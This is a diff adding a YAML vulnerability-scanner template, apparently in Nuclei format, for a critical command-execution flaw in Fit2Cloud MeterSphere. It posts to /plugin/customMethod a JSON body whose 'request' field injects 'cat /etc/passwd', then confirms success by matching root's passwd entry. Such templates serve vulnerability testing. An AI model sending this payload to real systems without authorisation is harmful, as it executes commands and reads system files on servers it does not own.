@@ -1,0 +1,24 @@
+id: yaml-poc-fit2cloud-metersphere-other-CT-416542
+info:
+  name: Yaml Poc Fit2Cloud Metersphere Other Ct 416542
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-fit2cloud-metersphere-other-CT-416542'
+  tags: xpoc
+  reference: []
+http:
+- method: POST
+  path:
+  - /plugin/customMethod
+  body: '{"entry": "Evil", "request": "cat /etc/passwd"}'
+  headers:
+    Content-Type: application/json
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: regex
+    part: body
+    regex:
+    - 'root:[x*]:0:0:'
